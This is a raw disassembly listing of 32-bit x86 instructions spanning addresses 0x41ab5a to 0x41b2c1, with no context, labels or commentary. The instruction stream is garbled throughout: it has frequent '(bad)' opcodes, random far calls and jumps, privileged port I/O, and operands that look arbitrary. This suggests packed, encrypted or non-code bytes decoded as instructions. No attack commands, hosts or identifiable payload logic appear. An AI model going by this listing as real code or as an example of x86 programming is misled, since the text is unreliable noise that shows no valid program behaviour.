  41ab5a:	shl    DWORD PTR [ecx],cl
  41ab5c:	xlat   BYTE PTR ds:[ebx]
  41ab5d:	das    
  41ab5e:	mov    cs:0xc28ef211,eax
  41ab64:	sti    
  41ab65:	mov    ch,0x88
  41ab67:	out    dx,eax
  41ab68:	sbb    BYTE PTR [eax-0x864388e],ch
  41ab6e:	cwde   
  41ab6f:	sub    esp,esi
  41ab71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab72:	(bad)  
  41ab74:	push   edx
  41ab75:	xlat   BYTE PTR ds:[ebx]
  41ab76:	into   
  41ab77:	jnp    0x41ab3a
  41ab79:	adc    eax,0xb9c2fb30
  41ab7e:	nop
  41ab7f:	adc    BYTE PTR [edx+0x18],dh
  41ab82:	inc    eax
  41ab83:	lds    ebx,FWORD PTR [ebp+0x7bdf0226]
  41ab89:	fs gs loopne 0x41ac05
  41ab8d:	out    0xc6,eax
  41ab8f:	or     DWORD PTR ds:0x66ec8d51,ebx
  41ab95:	or     eax,0x747deaf9
  41ab9a:	call   0x3a52f704
  41ab9f:	xchg   ecx,eax
  41aba0:	cmp    dl,bh
  41aba2:	das    
  41aba3:	or     DWORD PTR [edi],esp
  41aba5:	sbb    eax,0x22ef3349
  41abaa:	inc    esi
  41abab:	repnz or al,0x56
  41abae:	scas   eax,DWORD PTR es:[edi]
  41abaf:	jo     0x41abe1
  41abb1:	sbb    eax,0x73c86e68
  41abb6:	int3   
  41abb7:	inc    ebp
  41abb8:	sbb    al,BYTE PTR [edi-0x141698aa]
  41abbe:	add    BYTE PTR [eax+0x2dbb9d87],bl
  41abc4:	retf   
  41abc5:	or     al,0xd8
  41abc7:	dec    esi
  41abc8:	(bad)  
  41abc9:	sbb    al,0x56
  41abcb:	pop    ds
  41abcc:	js     0x41abb5
  41abce:	repz arpl WORD PTR [ebx-0x17],di
  41abd2:	(bad)  
  41abd3:	or     DWORD PTR [ebx],edx
  41abd5:	mov    al,ds:0xd6d9abcb
  41abda:	pop    es
  41abdb:	sub    ch,ch
  41abdd:	cld    
  41abde:	aam    0x7c
  41abe0:	mov    edx,0x4d553e50
  41abe5:	outs   dx,DWORD PTR ds:[esi]
  41abe6:	jmp    0x41ac4a
  41abe8:	ror    DWORD PTR [ebx],0x73
  41abeb:	retf   0x222a
  41abee:	xor    al,0x5e
  41abf0:	mov    eax,0x3300962
  41abf5:	add    ebp,edi
  41abf7:	xchg   ebx,eax
  41abf8:	jns    0x41abf1
  41abfa:	push   ecx
  41abfb:	xchg   esp,eax
  41abfc:	sub    DWORD PTR [ecx+0x54],eax
  41abff:	in     eax,dx
  41ac00:	shl    bh,0xdb
  41ac03:	xor    DWORD PTR [ebp-0x1412d421],ebx
  41ac09:	loopne 0x41ac2a
  41ac0b:	fwait
  41ac0c:	mov    BYTE PTR [esi+ecx*4-0x6f44686c],cl
  41ac13:	cmp    eax,0x95411c98
  41ac18:	cmc    
  41ac19:	adc    edx,DWORD PTR [ecx+0x14]
  41ac1c:	arpl   WORD PTR [eax+0x75ea5e6],dx
  41ac22:	out    dx,al
  41ac23:	mov    bl,0x5c
  41ac25:	sahf   
  41ac26:	pop    esp
  41ac27:	push   ecx
  41ac28:	shl    BYTE PTR [ebx+0x32],cl
  41ac2b:	lahf   
  41ac2c:	xchg   edx,eax
  41ac2d:	push   cs
  41ac2e:	mov    cl,0x95
  41ac30:	dec    ebp
  41ac31:	sub    BYTE PTR [edi+0x68],dh
  41ac34:	push   edx
  41ac35:	cmp    DWORD PTR [ebp-0x3547391e],ecx
  41ac3b:	xor    ecx,0x76
  41ac3e:	push   eax
  41ac3f:	xchg   BYTE PTR [esi-0x2b],dl
  41ac42:	jae    0x41acbe
  41ac44:	mov    cl,dh
  41ac46:	fdivrp st(6),st
  41ac48:	ds pop ebx
  41ac4a:	js     0x41ac1d
  41ac4c:	xlat   BYTE PTR ds:[ebx]
  41ac4d:	adc    eax,0x33fd9c06
  41ac52:	into   
  41ac53:	and    al,0x1
  41ac55:	imul   esp,DWORD PTR [ebx+edx*2],0xa69973c1
  41ac5c:	pop    ecx
  41ac5d:	out    0x1d,eax
  41ac5f:	jo     0x41acda
  41ac61:	call   0xef2c:0x12cc5994
  41ac68:	in     eax,dx
  41ac69:	lods   eax,DWORD PTR ds:[esi]
  41ac6a:	xchg   esi,eax
  41ac6b:	fisub  DWORD PTR [ebp+0x6a11d8da]
  41ac71:	outs   dx,DWORD PTR ds:[esi]
  41ac72:	aad    0x36
  41ac74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac75:	ret    0xf1fc
  41ac78:	aad    0x3
  41ac7a:	stos   DWORD PTR es:[edi],eax
  41ac7b:	daa    
  41ac7c:	dec    esp
  41ac7d:	stc    
  41ac7e:	pushf  
  41ac7f:	call   0x584d87a6
  41ac84:	push   eax
  41ac85:	ins    BYTE PTR es:[edi],dx
  41ac86:	pop    eax
  41ac87:	sbb    DWORD PTR [ebp+0x4718c36e],edi
  41ac8d:	pop    ecx
  41ac8e:	dec    ebp
  41ac8f:	fisttp QWORD PTR [ebx-0x4856db53]
  41ac95:	call   0x69c1e074
  41ac9a:	test   BYTE PTR [ebp-0x36e35b0a],dl
  41aca0:	loope  0x41ad02
  41aca2:	add    BYTE PTR ds:0xaad37b57,bh
  41aca8:	imul   ebx,edi,0xedeec8ea
  41acae:	or     BYTE PTR [ecx],dl
  41acb0:	test   BYTE PTR [ecx],bl
  41acb2:	retf   
  41acb3:	push   esi
  41acb4:	mov    fs,WORD PTR ds:0x1fb67942
  41acba:	icebp  
  41acbb:	sub    eax,0xbb87fe28
  41acc0:	sbb    bh,BYTE PTR [edi+0x728c83af]
  41acc6:	or     DWORD PTR [edx+edi*2],0xffffffd4
  41acca:	stc    
  41accb:	or     DWORD PTR [esp+ebx*8+0x3c],0x50
  41acd0:	xor    BYTE PTR ds:0x33142a0b,0x69
  41acd7:	xor    eax,0x644646cc
  41acdc:	loop   0x41acde
  41acde:	sbb    al,0x7a
  41ace0:	mov    eax,ds:0xa85a851
  41ace5:	push   ss
  41ace6:	sub    BYTE PTR [esi+0x4e],dl
  41ace9:	add    cl,ch
  41aceb:	xchg   DWORD PTR [ebp+0x27],edi
  41acee:	ins    DWORD PTR es:[edi],dx
  41acef:	outs   dx,BYTE PTR ds:[esi]
  41acf0:	test   BYTE PTR [edx-0x2f],ah
  41acf3:	gs iret 
  41acf5:	pop    ebp
  41acf6:	daa    
  41acf7:	dec    edi
  41acf8:	sub    al,ch
  41acfa:	jb     0x41aceb
  41acfc:	leave  
  41acfd:	xlat   BYTE PTR ds:[ebx]
  41acfe:	adc    esi,DWORD PTR [esi-0x5ae51792]
  41ad04:	les    ecx,FWORD PTR [ebx-0x7ef2f3f2]
  41ad0a:	inc    edx
  41ad0b:	imul   esp,esp,0x6c24587a
  41ad11:	jb     0x41acfe
  41ad13:	push   ss
  41ad14:	add    bh,BYTE PTR ds:0xcdb2259e
  41ad1a:	addr16 pop eax
  41ad1c:	cwde   
  41ad1d:	fild   WORD PTR [edi-0x366e99d]
  41ad23:	ret    0x5391
  41ad26:	mov    ch,0x75
  41ad28:	sub    BYTE PTR [ecx+esi*1+0x462953c0],0x5e
  41ad30:	sub    al,0xf0
  41ad32:	scas   al,BYTE PTR es:[edi]
  41ad33:	pop    edi
  41ad34:	test   BYTE PTR [edx+0x685d6e64],dh
  41ad3a:	jecxz  0x41adb6
  41ad3c:	pop    esp
  41ad3d:	add    DWORD PTR [edx+ebp*4-0x6e],0x17016a2a
  41ad45:	out    0xcf,al
  41ad47:	clc    
  41ad48:	ja     0x41ad12
  41ad4a:	xchg   esp,eax
  41ad4b:	xor    eax,0xb898e621
  41ad50:	mov    bl,0xa5
  41ad52:	jecxz  0x41ada8
  41ad54:	jg     0x41adc5
  41ad56:	dec    esi
  41ad57:	out    dx,eax
  41ad58:	idiv   BYTE PTR [eax-0x2e]
  41ad5b:	dec    ebp
  41ad5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad5d:	ss and al,0x43
  41ad60:	mov    cl,0x2c
  41ad62:	ins    BYTE PTR es:[edi],dx
  41ad63:	push   edx
  41ad64:	ins    BYTE PTR es:[edi],dx
  41ad65:	call   0xe7c6:0x4f441aed
  41ad6c:	jp     0x41ad83
  41ad6e:	shr    DWORD PTR [ebx+0x19],1
  41ad71:	call   0xc450100e
  41ad76:	sub    eax,0xb94b0cf
  41ad7b:	and    eax,DWORD PTR [edx]
  41ad7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad7e:	adc    esi,ebx
  41ad80:	xchg   esp,eax
  41ad81:	xor    al,0x1c
  41ad83:	popa   
  41ad84:	mov    edi,0x864d89d8
  41ad89:	cmp    ah,0x9d
  41ad8c:	or     ch,dh
  41ad8e:	pop    edx
  41ad8f:	inc    esi
  41ad90:	mov    DWORD PTR [edi+eiz*1+0x63b78b42],ecx
  41ad97:	ret    0xed3d
  41ad9a:	sub    al,0x93
  41ad9c:	push   ss
  41ad9d:	fcomp  QWORD PTR [ecx+0x9216a89]
  41ada3:	(bad)  
  41ada4:	(bad)  
  41ada5:	out    0xbd,eax
  41ada7:	inc    eax
  41ada8:	or     BYTE PTR [eax],0x17
  41adab:	shl    BYTE PTR [ecx],1
  41adad:	dec    edx
  41adae:	adc    ch,BYTE PTR [eax]
  41adb0:	push   es
  41adb1:	xor    al,BYTE PTR ds:0x2f7a0233
  41adb7:	retf   
  41adb8:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adba:	push   ebp
  41adbb:	mov    edx,0xb334c7c7
  41adc0:	ins    DWORD PTR es:[edi],dx
  41adc1:	jge    0x41adef
  41adc3:	dec    esi
  41adc4:	(bad)  
  41adc5:	in     eax,dx
  41adc6:	dec    esi
  41adc7:	pop    ecx
  41adc8:	dec    ebx
  41adc9:	pop    ss
  41adca:	shl    DWORD PTR [ecx+0x5b],1
  41adcd:	inc    esi
  41adce:	and    DWORD PTR [esi+0x0],ebp
  41add1:	adc    eax,0x2674450d
  41add6:	push   esp
  41add7:	fsub   QWORD PTR [esi]
  41add9:	retf   0xe597
  41addc:	int    0x84
  41adde:	jbe    0x41adf6
  41ade0:	mov    ecx,0x5287cd31
  41ade5:	scas   eax,DWORD PTR es:[edi]
  41ade6:	retf   0x5be1
  41ade9:	pop    eax
  41adea:	fistp  DWORD PTR [ebx-0x2c]
  41aded:	fucomi st,st(4)
  41adef:	adc    BYTE PTR [ebx+0x20ae1db7],ch
  41adf5:	pop    esi
  41adf6:	jnp    0x41ae53
  41adf8:	scas   al,BYTE PTR es:[edi]
  41adf9:	cmp    DWORD PTR [eax+0x77],edi
  41adfc:	cld    
  41adfd:	or     BYTE PTR [eax-0x2066db37],ch
  41ae03:	xchg   edx,eax
  41ae04:	lahf   
  41ae05:	and    eax,0x128c5cea
  41ae0a:	test   BYTE PTR [ecx-0x38b02b0b],ch
  41ae10:	lods   al,BYTE PTR gs:[esi]
  41ae12:	adc    al,0x7
  41ae14:	add    edx,DWORD PTR [ebx]
  41ae16:	mov    esp,0xe4a7d001
  41ae1b:	lahf   
  41ae1c:	xor    BYTE PTR [esi],dl
  41ae1e:	das    
  41ae1f:	jb     0x41adad
  41ae21:	mov    cl,0x9e
  41ae23:	adc    DWORD PTR [eax],ecx
  41ae25:	push   ebp
  41ae26:	sahf   
  41ae27:	outs   dx,DWORD PTR ds:[esi]
  41ae28:	mov    eax,ds:0x63aff454
  41ae2d:	sub    al,0x20
  41ae2f:	loop   0x41ade2
  41ae31:	les    edi,FWORD PTR [edx-0x1c]
  41ae34:	(bad)  [eax-0x723d75d4]
  41ae3a:	mov    edi,0x569a5c3
  41ae3f:	mov    ds:0xc09f67bd,al
  41ae44:	mov    BYTE PTR [edi+ecx*1+0x3d461e32],ah
  41ae4b:	xchg   edi,esp
  41ae4d:	cmp    DWORD PTR [esi+eiz*4+0x2dbd848b],ebx
  41ae54:	jo     0x41adea
  41ae56:	mov    ss,WORD PTR [ebp+0x28]
  41ae59:	mov    esi,0xad9652e1
  41ae5e:	sub    ch,cl
  41ae60:	mov    ecx,0x4773fe97
  41ae65:	fnstcw WORD PTR [edx]
  41ae67:	add    BYTE PTR [ebx],dl
  41ae69:	jnp    0x41aed9
  41ae6b:	cmovnp edi,edi
  41ae6e:	pushf  
  41ae6f:	mov    DWORD PTR [edx+0x44],eax
  41ae72:	xchg   edx,eax
  41ae73:	test   al,0xea
  41ae75:	aaa    
  41ae76:	xchg   edx,eax
  41ae77:	jp     0x41aecf
  41ae79:	retf   0x744c
  41ae7c:	inc    edx
  41ae7d:	sub    DWORD PTR [edx-0x4e17991a],esi
  41ae83:	lods   al,BYTE PTR ds:[esi]
  41ae84:	cmp    DWORD PTR [ebp+eiz*8+0x73],edx
  41ae88:	pop    eax
  41ae89:	jmp    FWORD PTR [esi+0xf68f5a6]
  41ae8f:	cmp    DWORD PTR ds:0xb64466f3,ecx
  41ae95:	and    ebx,DWORD PTR [eax+ecx*1]
  41ae98:	test   eax,0xd9d9900a
  41ae9d:	cmp    bh,bl
  41ae9f:	ins    DWORD PTR es:[edi],dx
  41aea0:	aad    0x98
  41aea2:	xor    DWORD PTR [edx+edx*1],edx
  41aea5:	imul   ebp,DWORD PTR [ebx+0x2b7b7d01],0xffffffa7
  41aeac:	sbb    eax,esi
  41aeae:	ins    DWORD PTR es:[edi],dx
  41aeaf:	scas   eax,DWORD PTR es:[edi]
  41aeb0:	add    eax,0x62ac877a
  41aeb5:	pushf  
  41aeb6:	sub    bh,BYTE PTR [eax]
  41aeb8:	and    DWORD PTR [eax+eiz*1+0x7d4ba20e],ebp
  41aebf:	rcl    esi,0xaa
  41aec2:	(bad)  
  41aec3:	aam    0x47
  41aec5:	mov    edx,0xb1252190
  41aeca:	jl     0x41af05
  41aecc:	inc    edx
  41aecd:	call   0xcc4c:0x8170a0ff
  41aed4:	cmp    ecx,DWORD PTR [ebx]
  41aed6:	outs   dx,DWORD PTR ds:[esi]
  41aed7:	push   eax
  41aed8:	ja     0x41ae5f
  41aeda:	pop    ebx
  41aedb:	arpl   WORD PTR [ebp+0x57],si
  41aede:	sub    dh,al
  41aee0:	xchg   edx,eax
  41aee1:	repz adc dl,bh
  41aee4:	jp     0x41af35
  41aee6:	fldcw  WORD PTR [esi-0x23171c0d]
  41aeec:	sub    esp,DWORD PTR [ebx+0x13f91e6b]
  41aef2:	aad    0xb3
  41aef4:	and    BYTE PTR [eax-0x2c59040f],0x81
  41aefb:	retf   0xf958
  41aefe:	fs inc ecx
  41af00:	jg     0x41aec3
  41af02:	inc    ebp
  41af03:	aaa    
  41af04:	stos   BYTE PTR es:[edi],al
  41af05:	jge    0x41af1b
  41af07:	mov    DWORD PTR [ebx+edx*1+0x53c4ad22],esi
  41af0e:	pop    es
  41af0f:	in     eax,dx
  41af10:	mov    edi,esp
  41af12:	out    dx,eax
  41af13:	xlat   BYTE PTR ds:[ebx]
  41af14:	leave  
  41af15:	sbb    ebx,DWORD PTR [edi]
  41af17:	fnstcw WORD PTR [ebx]
  41af19:	mov    cl,BYTE PTR [esi+ebx*1]
  41af1c:	sbb    DWORD PTR [esi+ebp*8-0x76],edi
  41af20:	push   0x662088d
  41af25:	sbb    dh,cl
  41af27:	out    0x98,al
  41af29:	in     al,0x96
  41af2b:	add    eax,0xca799bdd
  41af30:	fisub  WORD PTR [ebp-0x4e]
  41af33:	sbb    dl,BYTE PTR [ebx]
  41af35:	sti    
  41af36:	xchg   edx,eax
  41af37:	into   
  41af38:	jecxz  0x41aef5
  41af3a:	outs   dx,DWORD PTR ds:[esi]
  41af3b:	push   0x9cf8ef86
  41af40:	iret   
  41af41:	mov    WORD PTR [edx],?
  41af43:	push   0xe9cae773
  41af48:	retf   
  41af49:	mov    ?,ebp
  41af4b:	push   esi
  41af4c:	aad    0x6e
  41af4e:	mov    ebp,0x46aeef27
  41af53:	fcomp  st(6)
  41af55:	cmp    esp,0xffffff92
  41af58:	stos   BYTE PTR es:[edi],al
  41af59:	in     al,dx
  41af5a:	adc    al,0x8f
  41af5c:	adc    al,0xb1
  41af5e:	or     DWORD PTR [ecx+0x10],eax
  41af61:	aam    0x10
  41af63:	in     eax,dx
  41af64:	mov    ch,0xb0
  41af66:	cld    
  41af67:	test   eax,esi
  41af69:	loope  0x41af2d
  41af6b:	popf   
  41af6c:	outs   dx,DWORD PTR ds:[esi]
  41af6d:	jmp    0xb4cd:0x10595195
  41af74:	add    dh,BYTE PTR [ebx+0x2a8f4c51]
  41af7a:	jp     0x41af59
  41af7c:	ror    BYTE PTR [eax+0x5f],1
  41af7f:	ds shl DWORD PTR cs:[edx-0x71072939],0x7
  41af88:	je     0x41af4f
  41af8a:	and    edx,DWORD PTR [edx-0xc49d898]
  41af90:	lock inc ebx
  41af92:	or     esi,DWORD PTR [eax+0x43f7494c]
  41af98:	outs   dx,DWORD PTR ds:[esi]
  41af99:	pop    ss
  41af9a:	jbe    0x41af52
  41af9c:	(bad)  
  41af9d:	mov    ebx,0x839999ed
  41afa2:	and    BYTE PTR [ebp-0x5c822b4a],ah
  41afa8:	mov    ch,0x5a
  41afaa:	xor    dh,BYTE PTR [ebx+0x1c]
  41afad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afae:	(bad)  
  41afaf:	repz xchg ebx,eax
  41afb1:	outs   dx,DWORD PTR ds:[esi]
  41afb2:	adc    DWORD PTR [esi],ecx
  41afb4:	retf   0x943e
  41afb7:	jge    0x41b008
  41afb9:	pusha  
  41afba:	push   eax
  41afbb:	mov    ebx,0xedec1380
  41afc0:	inc    ebp
  41afc1:	or     BYTE PTR [ecx+eiz*4],dl
  41afc4:	cld    
  41afc5:	xor    BYTE PTR [edx-0x2b5ac79],0x44
  41afcc:	mov    ds:0xf6a28533,al
  41afd1:	push   eax
  41afd2:	addr16 or bl,bh
  41afd5:	mov    ah,0xa5
  41afd7:	xchg   edx,eax
  41afd8:	and    bh,BYTE PTR ds:0x8603ce0a
  41afde:	lods   al,BYTE PTR ds:[esi]
  41afdf:	xor    eax,0xcb7f9513
  41afe4:	xor    eax,0xf67d8305
  41afe9:	rcl    DWORD PTR [edi],0x7
  41afec:	pop    edi
  41afed:	jne    0x41b043
  41afef:	push   ebp
  41aff0:	out    0x70,eax
  41aff2:	mov    BYTE PTR [edi+0x3acfbb16],al
  41aff8:	xchg   ecx,eax
  41aff9:	jg     0x41b04e
  41affb:	in     eax,0xdc
  41affd:	add    dh,ch
  41afff:	sbb    al,ah
  41b001:	cmp    cl,0x30
  41b004:	xchg   esi,eax
  41b005:	rol    BYTE PTR [eax+0x67],0xad
  41b009:	dec    edi
  41b00a:	lahf   
  41b00b:	icebp  
  41b00c:	adc    DWORD PTR [edx+eiz*1],0x7343d28f
  41b013:	imul   edx,ebp,0x43
  41b016:	outs   dx,DWORD PTR ds:[esi]
  41b017:	jno    0x41b038
  41b019:	jl     0x41b051
  41b01b:	dec    eax
  41b01c:	fwait
  41b01d:	clc    
  41b01e:	sub    DWORD PTR [esi+0x2950c55d],edx
  41b024:	xchg   esp,eax
  41b025:	add    al,ah
  41b027:	inc    esp
  41b028:	inc    ebp
  41b029:	jg     0x41b06d
  41b02b:	fld    st(0)
  41b02d:	jne    0x41b081
  41b02f:	fld    DWORD PTR [ebx+0x7a0d1d0e]
  41b035:	lahf   
  41b036:	cs and cl,dl
  41b039:	mov    al,0x47
  41b03b:	leave  
  41b03c:	jge    0x41b077
  41b03e:	mov    dh,0xfd
  41b040:	push   ss
  41b041:	(bad)  
  41b042:	xor    DWORD PTR [ebp-0x2c],edi
  41b045:	je     0x41b075
  41b047:	stc    
  41b048:	call   0x9d02f67f
  41b04d:	mov    ebp,0x8bf371bc
  41b052:	xchg   esp,eax
  41b053:	inc    ebp
  41b054:	sub    BYTE PTR [edi],bh
  41b056:	bnd ret 0x30cd
  41b05a:	mul    bh
  41b05c:	lods   eax,DWORD PTR ds:[esi]
  41b05d:	mov    dh,0xd3
  41b05f:	fadd   DWORD PTR [ebp+0x78]
  41b062:	pop    ebx
  41b063:	ds aaa 
  41b065:	inc    esp
  41b066:	cmp    BYTE PTR [esi-0x64af755e],ah
  41b06c:	test   al,0x24
  41b06e:	sbb    ebp,DWORD PTR [edi]
  41b070:	aas    
  41b071:	imul   esp
  41b073:	popa   
  41b074:	xor    ecx,DWORD PTR [ecx]
  41b076:	push   DWORD PTR [edx+0x6edcef2f]
  41b07c:	dec    ebp
  41b07d:	add    BYTE PTR [edi+0x12],0xeb
  41b081:	test   DWORD PTR [edi],ebp
  41b083:	cs jp  0x41b045
  41b086:	lea    esi,[ebp-0x5cbddb2e]
  41b08c:	push   0x5c
  41b08e:	pusha  
  41b08f:	push   esp
  41b090:	mov    cl,0xb6
  41b092:	mov    ch,BYTE PTR [edx+0x6c6ff85]
  41b098:	xchg   esi,eax
  41b099:	adc    DWORD PTR [ebp-0x4c],edx
  41b09c:	sbb    ah,bl
  41b09e:	scas   eax,DWORD PTR es:[edi]
  41b09f:	sub    DWORD PTR [esp+ebx*1],ebp
  41b0a2:	dec    edi
  41b0a3:	jle    0x41b051
  41b0a5:	(bad)  
  41b0a6:	adc    ch,BYTE PTR [ebx-0x35]
  41b0a9:	add    esi,DWORD PTR [ebx+0x8f39706]
  41b0af:	adc    ebp,DWORD PTR [ebx-0x4c]
  41b0b2:	(bad)  
  41b0b3:	fsubr  DWORD PTR [ebx-0x28c90c2d]
  41b0b9:	add    dh,dl
  41b0bb:	stos   BYTE PTR es:[edi],al
  41b0bc:	loopne 0x41b0f8
  41b0be:	rcl    BYTE PTR [eax-0x744dd0d6],1
  41b0c4:	add    ecx,DWORD PTR [eax-0xba8ac4d]
  41b0ca:	xchg   ebx,eax
  41b0cb:	sub    al,0xed
  41b0cd:	mov    WORD PTR [esi],fs
  41b0cf:	fnstcw WORD PTR [ecx]
  41b0d1:	(bad)  
  41b0d2:	cmp    eax,0xa2fc652d
  41b0d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0d8:	cmp    BYTE PTR [edi-0x55],bh
  41b0db:	inc    esp
  41b0dc:	adc    eax,0x714d56ff
  41b0e1:	xchg   esp,eax
  41b0e2:	call   0x4a51bc48
  41b0e7:	dec    ebx
  41b0e8:	lods   eax,DWORD PTR ds:[esi]
  41b0e9:	loop   0x41b0d0
  41b0eb:	fiadd  DWORD PTR [ecx]
  41b0ed:	fdiv   DWORD PTR [eax+0x0]
  41b0f0:	push   ebp
  41b0f1:	jne    0x41b0cc
  41b0f3:	mov    DWORD PTR [esi],esp
  41b0f5:	std    
  41b0f6:	mov    bh,0xdc
  41b0f8:	jge    0x41b0b6
  41b0fa:	out    0x3,eax
  41b0fc:	cli    
  41b0fd:	out    0x3e,al
  41b0ff:	daa    
  41b100:	ds popf 
  41b102:	or     eax,0x5855ecba
  41b107:	call   0x3628:0xf6b77264
  41b10e:	in     al,0xee
  41b110:	in     eax,dx
  41b111:	or     DWORD PTR [ebx],ebp
  41b113:	xchg   DWORD PTR [ebp-0x2b],edi
  41b116:	das    
  41b117:	fiadd  WORD PTR [edx+0x12f84e52]
  41b11d:	fistp  WORD PTR [eax+0x5c6a514a]
  41b123:	pop    ds
  41b124:	outs   dx,BYTE PTR ds:[esi]
  41b125:	fnstenv [eax]
  41b127:	fstp   QWORD PTR [eax]
  41b129:	(bad)  
  41b12a:	pop    ebp
  41b12b:	fisubr WORD PTR [ebx]
  41b12d:	xchg   edi,eax
  41b12e:	mov    ebp,0xcbf820c8
  41b133:	xlat   BYTE PTR ds:[ebx]
  41b134:	mov    dh,0x3e
  41b136:	arpl   bp,cx
  41b138:	push   ecx
  41b139:	out    dx,eax
  41b13a:	and    al,0x18
  41b13c:	lahf   
  41b13d:	xor    ebp,DWORD PTR [ebp+0x9]
  41b140:	jbe    0x41b0e9
  41b142:	dec    ebx
  41b143:	jecxz  0x41b12a
  41b145:	(bad)
  41b148:	mov    esi,0xa93397cf
  41b14d:	sub    ebp,esp
  41b14f:	shl    DWORD PTR [ecx-0x6a],cl
  41b152:	cmp    eax,0x4df6da39
  41b157:	xchg   esp,eax
  41b158:	or     eax,DWORD PTR [eax+0x76]
  41b15b:	ret    
  41b15c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b15d:	mov    esp,0x8871c617
  41b162:	(bad)  
  41b163:	xor    esp,edx
  41b165:	xlat   BYTE PTR ds:[ebx]
  41b166:	cmc    
  41b167:	cmp    al,0x24
  41b169:	cli    
  41b16a:	jl     0x41b129
  41b16c:	push   eax
  41b16d:	jl     0x41b13b
  41b16f:	sub    DWORD PTR [ecx-0x718ce92],edi
  41b175:	and    WORD PTR [esi+0xfdfc837],bp
  41b17c:	and    ebx,edi
  41b17e:	gs rcl esp,1
  41b181:	adc    DWORD PTR [esp+ecx*1-0x32],0xf4963340
  41b189:	cwde   
  41b18a:	or     ebp,DWORD PTR [ecx-0x2c]
  41b18d:	add    eax,0xaaead1ba
  41b192:	addr16 in eax,0x55
  41b195:	dec    eax
  41b196:	fcomi  st,st(3)
  41b198:	adc    eax,0x2dae888b
  41b19d:	push   ebp
  41b19e:	out    dx,al
  41b19f:	or     ah,BYTE PTR [edi-0x4b7b40f6]
  41b1a5:	xor    ch,bl
  41b1a7:	adc    eax,0x18c59a7f
  41b1ac:	hlt    
  41b1ad:	ficomp DWORD PTR [ebx+0x2a2031d9]
  41b1b3:	enter  0x2202,0x3e
  41b1b7:	fistp  WORD PTR ds:[edi]
  41b1ba:	jge    0x41b225
  41b1bc:	jns    0x41b1a9
  41b1be:	mov    al,0x81
  41b1c0:	test   DWORD PTR [ebp-0x7a],ecx
  41b1c3:	in     al,dx
  41b1c4:	mov    dl,0x71
  41b1c6:	xor    BYTE PTR [ebx-0x50],cl
  41b1c9:	aam    0xe
  41b1cb:	jbe    0x41b201
  41b1cd:	and    DWORD PTR [ecx],esp
  41b1cf:	mov    edx,edx
  41b1d1:	jbe    0x41b184
  41b1d3:	ins    BYTE PTR es:[edi],dx
  41b1d4:	inc    ebx
  41b1d5:	inc    ebx
  41b1d6:	test   eax,0x1bd7f4c2
  41b1db:	pop    edx
  41b1dc:	push   ebp
  41b1dd:	jne    0x41b1b2
  41b1df:	jns    0x41b1de
  41b1e1:	imul   esp,ebp,0xffffffea
  41b1e4:	push   ds
  41b1e5:	outs   dx,BYTE PTR ds:[esi]
  41b1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1e7:	pop    ebx
  41b1e8:	mov    eax,0x9f555b20
  41b1ed:	arpl   WORD PTR [ebx+0xf],bp
  41b1f0:	xchg   ecx,eax
  41b1f1:	(bad)  
  41b1f2:	or     al,0x10
  41b1f4:	and    edx,DWORD PTR [edx-0xc]
  41b1f7:	jno    0x41b242
  41b1f9:	(bad)  
  41b1fa:	mov    eax,0xae44dfff
  41b1ff:	(bad)  
  41b200:	iret   
  41b201:	(bad)  
  41b202:	div    BYTE PTR [esi+0x5a234be0]
  41b208:	mov    esi,0xdc41b063
  41b20d:	mov    BYTE PTR [ebx+0x3a],dh
  41b210:	dec    eax
  41b211:	fsub   DWORD PTR [ebp+0xfa57f5]
  41b217:	and    ch,BYTE PTR [edi+0x659bae3e]
  41b21d:	aaa    
  41b21e:	not    BYTE PTR [eax]
  41b220:	jecxz  0x41b1d7
  41b222:	pop    edi
  41b223:	mov    DWORD PTR [eax-0x3df05093],ebx
  41b229:	mov    eax,ds:0x44f9cf1d
  41b22e:	test   ah,dl
  41b230:	sub    al,0xfe
  41b232:	jp     0x41b1ba
  41b234:	test   DWORD PTR [ecx+esi*8+0x178b45b],ebp
  41b23b:	and    edi,DWORD PTR [ecx]
  41b23d:	repnz mov ebx,0x3fa8f44
  41b243:	sahf   
  41b244:	fisub  DWORD PTR [ecx+0x1df194f7]
  41b24a:	popf   
  41b24b:	fbstp  TBYTE PTR [eax]
  41b24d:	mov    ebx,0xe7b056b7
  41b252:	gs (bad) 
  41b254:	hlt    
  41b255:	pop    esp
  41b256:	out    dx,al
  41b257:	xor    DWORD PTR ds:0xd7d9eb48,ebp
  41b25d:	or     eax,0xfa7f5414
  41b262:	mov    DWORD PTR [edi+0x49],ebx
  41b265:	add    eax,0x10f9bd6a
  41b26a:	fdivr  QWORD PTR [esi]
  41b26c:	mov    es,edi
  41b26e:	rcl    DWORD PTR ds:0x9bf35675,cl
  41b274:	push   ebx
  41b275:	mov    edi,0x7ca3e5ab
  41b27a:	test   eax,0xab99924
  41b27f:	mov    BYTE PTR [ebx+0x3e7bda75],cl
  41b285:	enter  0xa381,0x1f
  41b289:	push   esp
  41b28a:	dec    ebp
  41b28b:	popa   
  41b28c:	jmp    0x41b2ee
  41b28e:	lea    edi,ds:0xf7249a11
  41b294:	cmp    eax,esp
  41b296:	pop    edx
  41b297:	lods   al,BYTE PTR ds:[esi]
  41b298:	jle    0x41b30a
  41b29a:	cdq    
  41b29b:	push   ecx
  41b29c:	cmp    dh,dl
  41b29e:	jg     0x41b307
  41b2a0:	pop    es
  41b2a1:	lahf   
  41b2a2:	xor    ebx,DWORD PTR [ebx]
  41b2a4:	xor    al,0xee
  41b2a6:	je     0x41b2c4
  41b2a8:	dec    ebx
  41b2a9:	les    esp,FWORD PTR [ebx]
  41b2ab:	dec    edx
  41b2ac:	outs   dx,DWORD PTR ds:[esi]
  41b2ad:	(bad)  
  41b2ae:	out    dx,al
  41b2af:	in     al,dx
  41b2b0:	dec    ebx
  41b2b1:	imul   esp,DWORD PTR ds:0xd4e8adc,0xffffffe1
  41b2b8:	xor    BYTE PTR [ebx-0x5c],bl
  41b2bb:	lahf   
  41b2bc:	mov    eax,0x9bb83fca
  41b2c1:	xchg   edx,eax
